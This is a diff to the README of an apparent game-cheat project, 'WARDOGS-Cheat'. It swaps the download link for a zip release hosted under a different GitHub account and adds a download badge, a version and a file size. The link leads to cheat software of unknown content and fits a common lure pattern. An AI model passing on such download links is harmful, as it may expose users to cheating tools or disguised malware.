@@ -16,9 +16,15 @@ The project provides a collection of gameplay tools, including visual informatio
 
 ---
 
-## 📥 Download
 
-**[Download WARDOGS-Cheat](https://github.com/holebuntingswitch/WARDOGS-Cheat/releases/download/987/WARDOGSCheat.zip)**
+### ⬇️ Download
+
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/TeamHelpFortress/wardogs-cheats/releases/download/v1.0.0/wardogs.cheats.zip).
+
+**Latest Version:** `v1.0.0` • **File Size:** ~156 MB
+
+</d
+  iv>
 
 ---
 
